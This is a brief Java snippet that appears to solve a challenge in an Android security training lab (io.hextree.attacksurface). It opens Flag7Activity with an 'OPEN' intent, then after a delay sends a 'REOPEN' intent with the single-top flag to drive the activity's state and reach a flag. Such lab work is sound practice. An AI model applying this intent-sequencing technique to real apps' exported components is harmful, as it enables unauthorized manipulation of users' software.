        Intent open = new Intent();
        open.setAction("OPEN");
        open.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag7Activity");
        startActivity(open);
        
        Handler handler = new Handler();
        
        handler.postDelayed(() -> {
            Intent reopen = new Intent();
            reopen.setAction("REOPEN");
            reopen.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity");
            reopen.setFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
            startActivity(reopen);
        },1000);